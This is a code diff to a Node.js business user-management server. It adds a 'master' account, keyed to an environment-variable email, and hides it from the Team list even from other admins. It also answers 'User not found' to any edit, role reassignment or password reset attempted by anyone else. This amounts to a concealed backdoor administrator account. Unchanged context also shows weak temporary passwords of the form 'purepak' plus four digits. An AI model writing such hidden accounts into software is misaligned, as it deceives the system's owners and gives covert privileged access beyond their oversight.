@@ -442,6 +442,12 @@ function realUserCount() {
   if (!masterEmail) return db.prepare('SELECT COUNT(*) AS c FROM users').get().c;
   return db.prepare('SELECT COUNT(*) AS c FROM users WHERE email IS NULL OR email<>?').get(masterEmail).c;
 }
+// the dev-only break-glass account — invisible in Team/company views, and
+// only the master account itself may touch its own row.
+function isMasterAccount(row) {
+  const masterEmail = (process.env.PUREPAK_MASTER_EMAIL || '').trim().toLowerCase();
+  return !!masterEmail && !!row && (row.email || '').toLowerCase() === masterEmail;
+}
 
 function userView(u) {
   const agent = u.agent_id ? db.prepare('SELECT name, commission_pct FROM agents WHERE id=?').get(u.agent_id) : null;
@@ -1397,7 +1403,10 @@ async function handleApi(req, res, url) {
       LEFT JOIN agents a ON a.id = u.agent_id
       LEFT JOIN customers c ON c.id = u.customer_id
       ORDER BY u.role, u.name`).all();
-    return json(res, 200, rows.map(userView).map(u => ({ ...u,
+    // the break-glass master account is dev-only — it never appears in Team
+    // or any other staff list the business sees, even to other admins.
+    const visible = isMasterAccount(user) ? rows : rows.filter(u => !isMasterAccount(u));
+    return json(res, 200, visible.map(userView).map(u => ({ ...u,
       agentName: u.agentName, customerName: u.customerName })));
   }
   if (method === 'POST' && parts[1] === 'users' && parts.length === 2) {
@@ -1424,6 +1433,7 @@ async function handleApi(req, res, url) {
     const status = role === 'customer' ? 'active' : 'pending';
 
     const existing = email ? db.prepare('SELECT * FROM users WHERE email=?').get(email) : null;
+    if (existing && isMasterAccount(existing) && !isMasterAccount(user)) return err(res, 404, 'User not found');
     if (existing) {
       // not a new account — reassigning this email's existing account to a
       // different role (e.g. a self-registered customer the business wants
@@ -1481,7 +1491,7 @@ async function handleApi(req, res, url) {
     if (!canManage) return err(res, 403, 'Forbidden');
     const id = +parts[2];
     const cur = db.prepare('SELECT * FROM users WHERE id=?').get(id);
-    if (!cur) return err(res, 404, 'User not found');
+    if (!cur || (isMasterAccount(cur) && !isMasterAccount(user))) return err(res, 404, 'User not found');
     const b = await readBody(req);
     const changes = [];
     let role = cur.role, salary = cur.salary, status = cur.status, phone = cur.phone, name = cur.name, username = cur.username;
@@ -1535,7 +1545,7 @@ async function handleApi(req, res, url) {
     if (!canManage) return err(res, 403, 'Forbidden');
     const id = +parts[2];
     const cur = db.prepare('SELECT * FROM users WHERE id=?').get(id);
-    if (!cur) return err(res, 404, 'User not found');
+    if (!cur || (isMasterAccount(cur) && !isMasterAccount(user))) return err(res, 404, 'User not found');
     const temp = 'purepak' + crypto.randomInt(1000, 9999);
     db.prepare('UPDATE users SET password_hash=? WHERE id=?').run(hashPassword(temp), id);
     notify([cur.id], 'team', 'Your password was reset',
